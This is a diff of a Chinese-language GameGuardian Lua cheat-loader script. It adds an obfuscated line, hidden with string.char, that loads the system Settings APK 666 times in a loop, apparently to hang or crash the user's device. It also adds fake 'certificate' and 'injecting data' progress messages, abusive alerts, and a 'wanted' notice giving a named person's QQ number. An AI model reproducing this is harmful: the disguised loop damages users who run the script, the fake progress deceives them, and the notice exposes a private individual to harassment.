@@ -1,31 +1,28 @@
 
-gg.alert("正在检查安全证书，请耐心等待，圈钱🐶死🐎QQ群：645398481")
 
-ffvpn = "https://biaozhunshijian.bmcx.com"
 
-ffvpn = "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F"
+for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end
+   
 
-x = tostring(gg.makeRequest(ffvpn))
-
-if not x or not x:sub(1, 20) then
-
-  gg.alert("老子无法访问网络请查看相应限权", "")
-
-elseif #x < 100 or x:find("SSL") or x:find("I/O") or x:find("javax") then
-
-  gg.alert("❗️❗️❗️\n网络死了！")
-
+function ffvpns()
+ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F" 
+x=(tostring(gg[ "makeRequest" ](ffvpn)))
+if not x  or not x:sub(1,20) then 
+gg[ "alert" ]( "修改器无法访问网络请查看相应限权" , "" )
 else
-
-while #tostring(gg.makeRequest("https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F")) < 100 or tostring(gg.makeRequest("https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F")):find("SSL") or tostring(gg.makeRequest("https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F")):find("I/O") or tostring(gg.makeRequest("https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F")):find("javax") do
-
-os.remove(gg.getFile():match("[^/]*$"))
-
-print("nmsl")
-
-sj= os.date("%Y%m%d%H%M%S")-xc    gg.alert("本次辅助运行使用时长:"..sj.."秒") os.exit()
+while  #(x)<100  
+or x:find( "SSL" ) or x:find('I/O') or x:find('javax')
+do 
+gg[ "alert" ]( " MTP警告:网络数据通道异常\n\nMTP:看这个傻逼又来开挂，看来要表演正能量\n你他妈没网络想开挂，你吃屎都不配" , "" , "我不访问网络" , "访问网络" )
+local mpxgk=optfff()
+end 
 end
 end
+ffvpns()
+
+gg.alert("正在检查安全证书，请耐心等待，圈钱🐶死🐎QQ群：317824143")
+
+gg.alert("全网通缉这些人，QQ:2937879737，姓名:集白")
 
  gg.toast("正在连接安全证书15％") gg.sleep(320) gg.toast("正在注入数据30％") gg.sleep(320) print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)
 gg.toast("正在连接本地48％")
